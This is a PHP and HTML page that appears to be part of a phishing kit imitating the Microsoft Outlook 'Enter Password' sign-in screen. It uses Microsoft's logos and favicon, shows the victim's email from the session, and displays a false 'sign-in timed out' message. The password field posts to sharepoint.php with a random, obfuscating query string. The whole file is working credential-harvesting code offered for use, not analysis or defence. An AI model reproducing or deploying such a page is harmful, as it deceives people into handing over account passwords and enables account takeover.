<?php
session_start();
function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key]; 
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));


$email = $_SESSION['email'];
$_SESSION['msg'] = "Sorry, your sign-in timed out. Please try again.";

$enter = "sharepoint.php?$url";
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta content="width=device-width, initial-scale=1" name="viewport" />
<title>Sign in to Outlook</title>
<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js"></script>
<link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<link rel="apple-touch-icon" sizes="180x180" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<script src="https://kit.fontawesome.com/7cd4d97275.js"></script>
</head>
    
<style>
    @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
    
    body{
        background-image: url(https://i.imgur.com/I4Qd9nH.jpg);
        background-repeat: no-repeat;
        background-size: cover;
        text-align: center;
        border: 0;
        outline: 0;
        
    }
    
    .error{
        color: #ea3e23;
        font-family: 'Open Sans', sans-serif;
        font-size: 14px;
        text-align: left;
    }
    
    .automsg{
        color: #000000;
        font-family: 'Open Sans', sans-serif;
        font-size: 14px;
        text-align: left;
    }
    
    input[type=password].error:focus{
    border-bottom-color: #ea3e23;
	border-bottom-style: solid;   
    border-width: 1px;
    outline: 0;
    color: #333333;
    }
  
    .logo{
        padding-top: 11%;
        padding-bottom: 1.2%;
        width: 180px;
        image-resolution: from-image;
    }
    
    fieldset{
        border: 0;
        background-color: #ffffff;
        width: 415px;
        height: 350px;
        margin: 0 auto;
        outline: none;
        align-self: center;
    }
    
    form{
        margin: 8% 8%;
    }
    
    .micrologo{
        float: left;
    }
    
    .arrow{
        padding-top: 2%;
        width: 100%;
        text-align: left;
        font-family: 'Roboto', sans-serif;
        font-weight: lighter;
        font-size: 13px;
        color: #333;
    }
    
    .email{
        font-size: 15px;
        font-weight: normal;
    }
    
    h1{
        width: 100%;
        text-align: left;
        font-family: 'Roboto', sans-serif;
        font-size: 24px;
        color: #333;
        
    }
    
    input[type=password]{
        width: 345px;
        height: 25px;
        border-style: none none solid none;
        border-width: thin;
        font-size: 14px;
        font-family: 'Open Sans', sans-serif;
        font-weight: lighter;
        outline: 0;
        padding-bottom: 3px;
        padding-top: 1%;
    }
    
    input[type=password]:focus{
    border-bottom-color: #0078d7;
	border-bottom-style: solid;   
    border-width: 1px;
    outline: 0;
    }
    
    input[type=submit]{
        font-size: 15px;
        color: #FFFFFF;
        float: right;
        border: 0;
        outline: 0;
        height: 33px;
        width: 108px;
        background-color: #0869B6;
    }
    
    p{
        line-height: 0;
        padding-top: 15px;
        text-align: left;
        font-family: 'Roboto', sans-serif;
        font-size: 13px;
        font-weight: normal;
        color: #0869B6;
    }
    
    .footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        background-color: #000000;
        opacity: 0.5;
        filter: alpha(opacity=50); /* For IE8 and earlier */
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
    .fnote {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        z-index: 1;
        color: white;
        text-align: right;
        font-family: 'Roboto', sans-serif;
        font-size: 12px;
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
    .noaccess{
        float: left;
        font-family: 'Roboto', sans-serif;
        font-size: 13px;
        font-weight: normal;
        color: #0869B6;
    }
    
    a{
        text-decoration: none;
        color: #ffffff;
    }
    
@media screen and (max-width: 600px) {
    body {
        background-image: url(https://i.imgur.com/I4Qd9nH.jpg);
        background-repeat: no-repeat;
        background-size: auto;
        text-align: center;
        border: 0;
        outline: 0;
		padding: 0 1px;
    }
    
	.logo{
        padding-top: 4%;
        padding-bottom: 6%;
        width: 180px;
        image-resolution: from-image;
    }
	
    fieldset{
        border: 0;
        background-color: #ffffff;
        width: auto;
        height: 334px;
        margin: 0 auto;
        outline: none;
        align-self: center;
	}
	
	input[type=password]{
        width: 100%;
        height: 25px;
        border-style: none none solid none;
        border-width: thin;
        font-size: 14px;
        font-family: 'Open Sans', sans-serif;
        font-weight: lighter;
        outline: 0;
        padding-bottom: 3px;
        padding-top: 1%;
    }
    
    .footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        background-color: #000000;
        opacity: 0.5;
        filter: alpha(opacity=50); /* For IE8 and earlier */
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
    
    .fnote {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        height: 17px;
        z-index: 1;
        color: white;
        text-align: center;
        font-family: 'Roboto', sans-serif;
        font-size: 12px;
        padding-top: 10px;
        padding-bottom: 5px;
        padding-right: 150px;
    }
}
    
</style>
<body>

   
    <img src="https://i.imgur.com/eDXfU9D.png" class="logo">
    
    
        <fieldset>
    <form method="post" action="<? echo $enter; ?>" autocomplete="off" name="login" id="login">
       <img src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"  class="micrologo">
       <br>
        <h4 class="arrow"><span></span>&nbsp;<span class="email"><? echo $email; ?></span> </h4>
       <h1>Enter Password</h1>
        
<div id="error" class="error"><?
    if (!empty($_SESSION['msg'])) {
 echo $_SESSION['msg'];
 unset($_SESSION['msg']);
 }
    ?></div>
        <input type="hidden"  name="email" id="email"  value="<? echo $email; ?>">
        <input type="password"  name="password" id="password" placeholder="Password" value="">
        <p><a href="#" style="color:#0869B6;">Forgot my password</a></p>
<div>&nbsp;</div>
        <input type="submit" name="submit" id="submit" value="Sign in">
               
    </form>
    </fieldset>
    
    <div class="footer"></div>
    <div class="fnote">
        <span class="footernote"><a href="#"></a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="#">Terms of use</a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="#">Privacy & cookies</a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="#">.&nbsp;.&nbsp;.</a>&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<script>
$(document).ready(function(){
  $("#login").validate({
      errorLabelContainer: '#error',
    // Specify validation rules
    rules: {
      cpassword: {
        required: true,
        cpassword: true
      },
    },
    messages: {     
     cpassword: {
      required: "Please enter your password.",
      cpassword: "Please enter your password.",
     },
    },
  
  });
});
</script>
<script>
    window.onload = function() {
  var input = document.getElementById("password").focus();
}
</script>
</body>
</html>